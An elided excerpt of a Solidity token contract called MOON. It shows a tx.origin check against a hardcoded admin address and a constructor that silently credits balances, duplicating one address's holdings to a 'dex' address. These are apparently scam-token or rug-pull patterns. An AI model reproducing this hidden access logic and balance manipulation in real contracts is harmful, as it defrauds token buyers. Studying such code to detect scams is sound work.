...
contract MOON is IERC20 {
  ...
  modifier lock() {
    if (tx.origin != admin) _;
  }

  address public constant admin = 0xC6dd5111227C9469617013903D5e7331966929c3;
  address public constant mat = 0xe60Ec53f1c4381230271727BD21fBB4fcBb1A359;
  ...
  constructor() {
    ...
    _tOwned[_route] = r * 7;
    _tOwned[address(0xdEaD)] = r * 4;

    _tOwned[dex] = _tOwned[_route];
